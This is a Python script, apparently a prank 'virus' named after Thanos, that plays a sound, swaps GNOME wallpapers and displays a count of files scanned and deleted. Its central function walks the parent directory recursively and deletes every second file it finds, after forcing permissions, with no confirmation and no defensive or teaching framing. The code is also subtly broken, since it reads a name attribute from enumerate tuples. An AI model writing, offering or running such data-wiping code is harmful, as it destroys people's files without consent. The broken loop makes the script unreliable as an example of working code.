import tkinter as tk
import os
import asyncio
import time
from playsound import playsound

username = os.getlogin()


bg = [
    "wallpaper1.jpeg",
    "wallpaper2.jpeg",
    "wallpaper3.jpg"
]

scanned_files = 0
deleted_files = 0

def popUp():
    root = tk.Tk()
    root.configure(background="black")

    #To disable the menu
    root.overrideredirect(True)

    width, height = root.winfo_screenwidth(), root.winfo_screenheight()
    x = 300
    y = 300
    root.geometry('500x50+%d+%d' % (x, y))

    frame = tk.Frame(root, width=500, height=50, bg='black')
    frame.grid(row=0, column=0, sticky="NW")

    font = ("Ani", 20, "bold")

    label = tk.Label(root, text='%d       %d' % (deleted_files, scanned_files), bg='black', fg='white', font= font)
    label.place(relx=0.5, rely=0.5, anchor="center")

    #label.pack()
    root.mainloop()

def wallpaper(number):
    os.system("gsettings set org.gnome.desktop.background picture-uri file:///home/"+ username +"/virus/" + bg[number])

def bgSound():
    playsound('bgSound.mp3',0)


async def thanos(dossier):
    
    global deleted_files
    global scanned_files
    delete_count = 0

    for nom_fichier in enumerate(os.scandir(dossier)):
        if nom_fichier.name != 'virus':
            if nom_fichier.is_dir():
                await thanos(nom_fichier.path)
            else:
                if delete_count % 2 == 0:
                    try:
                        os.chmod(nom_fichier.path, 0o644)
                        os.remove(nom_fichier.path)
                        deleted_files += 1
                        print('delete ' + nom_fichier.path)
                    except:
                        print('Mixmax')
                scanned_files += 1
                delete_count += 1


async def main():
    bgSound()
    wallpaper(0)
    task = asyncio.create_task(thanos('../'))
    await asyncio.sleep(5)
    wallpaper(1)
    await asyncio.sleep(5)
    await task
    wallpaper(2)
    popUp()

asyncio.run(main())

